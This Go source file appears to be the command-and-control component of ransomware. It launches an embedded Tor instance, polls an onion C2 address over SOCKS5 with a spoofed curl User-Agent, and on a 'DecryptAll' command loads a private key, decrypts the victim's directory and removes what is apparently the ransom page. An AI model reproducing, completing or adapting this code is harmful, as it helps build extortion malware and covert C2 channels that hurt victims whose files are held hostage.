package main

import (
	"fmt"
	"github.com/hailiang/gosocks"
	"io/ioutil"
	"net/http"
	"os"
	"regexp"
	"strings"
	"time"
	"unsafe"
)

// #cgo CFLAGS: -I. -Isrc/or -Isrc/common -Isrc/ext -I../opt/include
// #cgo LDFLAGS: -Lsrc/or -Lsrc/common -L../opt/lib -L/usr/lib/x86_64-linux-gnu -ltor -ltor-testing  -lor-event -lor-crypto -lor -lor-testing -lcurve25519_donna -lssl -lcrypto -lz -levent -lm -lpthread -ldl -lrt
// #include <or.h>
// #include <main.h>
import "C"

func PrepareProxyClient() *http.Client {
	dialSocksProxy := socks.DialSocksProxy(socks.SOCKS5, "127.0.0.1:9050")
	transport := &http.Transport{Dial: dialSocksProxy}
	return &http.Client{Transport: transport}
}

func HttpGet(httpClient *http.Client, url string) (resp *http.Response, err error) {
	req, err := http.NewRequest("GET", url, nil)
	req.Header.Set("User-Agent", "curl/7.21.4 (universal-apple-darwin11.0) libcurl/7.21.4 OpenSSL/0.9.8x zlib/1.2.5")
	resp, err = httpClient.Do(req)
	return
}

func HttpGetBody(httpClient *http.Client, url string) (body string, err error) {
	resp, err := HttpGet(httpClient, url)
	if err != nil {
		return
	}
	defer resp.Body.Close()
	bodyb, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return
	}
	body = string(bodyb)
	return
}

func GetNextCmd() (string, error) {
	clientPtr := PrepareProxyClient()
	url := "http://" + (*clientConfig).OnionUrl
	log.Debug("Connecting to %s", url)
	body, err := HttpGetBody(clientPtr, url)
	if err != nil {
		return "", err
	}
	bodyStr := string(body)
	log.Debug("%s", bodyStr)
	return bodyStr, nil

}

func ExecCmd(cmd string) error {

	if strings.Contains(cmd, "DecryptAll") {
		rr := regexp.MustCompile(`^DecryptAll\s+(\w+)[\n\r.]*$`)
		matchRes := rr.FindStringSubmatch(cmd)
		if matchRes != nil {
			log.Debug("Using private key #%s#", matchRes[1])
			err := SetServerPrivateKey(matchRes[1])
			if err != nil {
				return err
			}
			DecryptDir(".")
			UninstallRSWPage()
			os.Exit(0)

		}
	} else {
		log.Debug("Unsupported command")
	}
	return nil

}

func StartTor() {

	arg1 := C.CString("tor")
	args := make([]*C.char, 1)
	args[0] = arg1
	fmt.Printf("Starting Tor...\n")
	fmt.Println("Done ", C.tor_main(1, (**C.char)(unsafe.Pointer(&args[0]))))

}

func WaitForCC(pollPeriod int) {

	go StartTor()
	ticker := time.NewTicker(time.Duration(pollPeriod) * time.Second)

	for {
		select {
		case <-ticker.C:
			cmd, err := GetNextCmd()
			if err != nil {
				log.Debug("%s", err)
			} else {
				err = ExecCmd(cmd)
				if err != nil {
					log.Debug("%s", err)
				}
			}
		}

	}

}
